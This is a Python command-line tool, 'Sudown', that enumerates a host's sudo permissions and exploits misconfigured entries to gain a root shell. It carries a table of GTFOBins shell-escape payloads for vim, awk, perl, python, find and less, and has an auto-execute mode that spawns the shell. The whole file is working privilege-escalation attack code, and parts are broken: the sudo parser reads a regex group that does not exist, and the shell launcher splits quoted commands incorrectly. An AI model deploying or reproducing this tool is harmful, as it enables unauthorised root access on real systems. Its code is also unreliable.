#!/usr/bin/env python3

import subprocess
import re
import json
import os
import pty
import argparse
import getpass
import shutil
import sys
import platform
import pwd

# GTFOBins lookup dictionary
GTFOBINS = {
    "vim": "sudo vim -c ':!/bin/sh'",
    "less": "sudo less /etc/passwd  # then type !/bin/sh",
    "awk": "sudo awk 'BEGIN {system(\"/bin/sh\")}'",
    "perl": "sudo perl -e 'exec \"/bin/sh\";'",
    "python": "sudo python -c 'import os; os.system(\"/bin/sh\")'",
    "find": "sudo find . -exec /bin/sh \;"
    # Add more mappings as needed
}

class SudoEntry:
    def __init__(self, binary, args, as_user, nopasswd):
        self.binary = binary
        self.args = args
        self.as_user = as_user
        self.nopasswd = nopasswd

    def to_dict(self):
        return {
            "binary": self.binary,
            "args": self.args,
            "as_user": self.as_user,
            "nopasswd": self.nopasswd
        }

def run_sudo_l():
    try:
        result = subprocess.run(["sudo", "-l"], capture_output=True, text=True)

        if "a terminal is required to read the password" in result.stderr.lower() or \
           "password is required" in result.stderr.lower() or \
           "sudo: " in result.stderr.lower() and "password" in result.stderr.lower():
            print("[!] Password required for sudo -l")
            password = getpass.getpass("Enter your password for sudo: ")
            result = subprocess.run(
                ["sudo", "-S", "-l"],
                input=password + "\n",
                capture_output=True,
                text=True
            )
            if "incorrect password" in result.stderr.lower():
                print("[-] Incorrect password.")
                return ""

        return result.stdout
    except Exception as e:
        return str(e)

def parse_sudo_l(output):
    entries = []
    pattern = re.compile(r'\(.*?\) (NOPASSWD:|PASSWD:) (.*)')
    for line in output.splitlines():
        match = pattern.search(line)
        if match:
            as_user = match.group(1)
            nopasswd = match.group(2) == "NOPASSWD:"
            command = match.group(3).strip()
            binary = command.split()[0]
            args = command[len(binary):].strip() if len(command.split()) > 1 else ""
            entries.append(SudoEntry(binary, args, as_user, nopasswd))
    return entries

def find_exploitable(entries):
    exploits = []
    for entry in entries:
        bin_name = entry.binary.split("/")[-1]
        if bin_name in GTFOBINS:
            exploits.append({
                "binary": entry.binary,
                "exploit": GTFOBINS[bin_name],
                "as_user": entry.as_user,
                "nopasswd": entry.nopasswd
            })
    return exploits

def spawn_shell(command):
    print(f"[+] Executing: {command}")
    try:
        os.system("stty raw -echo")
        pty.spawn(command)
    except Exception as e:
        print(f"[-] Shell spawn failed: {e}")
    finally:
        os.system("stty sane")

def system_info():
    print("[+] System & User Info")
    print(f"    Hostname   : {platform.node()}")
    print(f"    OS         : {platform.system()} {platform.release()} ({platform.version()})")
    print(f"    Architecture: {platform.machine()}")
    print(f"    Current User: {pwd.getpwuid(os.geteuid()).pw_name} (UID: {os.geteuid()})\n")

def sanity_checks():
    system_info()
    print("[+] Performing environment checks...")
    for binary in ["sudo", "/bin/sh"]:
        if not shutil.which(binary):
            print(f"[-] Required binary not found: {binary}")
            sys.exit(1)
    if not sys.stdin.isatty():
        print("[-] Not running in an interactive terminal — may break password prompt or TTY shell.")
        sys.exit(1)
    print("[+] Environment looks good!\n")

def main(auto_execute=False, first_only=False, no_spawn=False):
    sanity_checks()
    print("[+] Running sudo -l")
    output = run_sudo_l()
    entries = parse_sudo_l(output)
    print("[+] Detected sudo entries:")
    for e in entries:
        print("  -", e.to_dict())

    print("[+] Searching for known GTFOBin exploits")
    exploits = find_exploitable(entries)
    for idx, exp in enumerate(exploits):
        print(f"[!] Exploitable: {exp['binary']} as {exp['as_user']} (NOPASSWD: {exp['nopasswd']})")
        print(f"    → Run: {exp['exploit']}")
        if auto_execute and exp['nopasswd'] and not no_spawn:
            spawn_shell(exp['exploit'].split())
            if first_only:
                break

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Sudown - Sudo Misconfiguration Exploiter",
        epilog="""
Examples:
  ./sudown.py            # Discover misconfigurations and print payloads
  ./sudown.py -a         # Auto-exploit all NOPASSWD targets
  ./sudown.py -a -f      # Only auto-exploit the first available target
  ./sudown.py -a -n      # Evaluate and show payloads but don't spawn shells
        """,
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument("-a", "--auto", action="store_true", help="Auto-execute detected exploits")
    parser.add_argument("-f", "--first", action="store_true", help="Only auto-exploit the first target")
    parser.add_argument("-n", "--no-spawn", action="store_true", help="Print exploits but skip execution")
    args = parser.parse_args()
    main(auto_execute=args.auto, first_only=args.first, no_spawn=args.no_spawn)
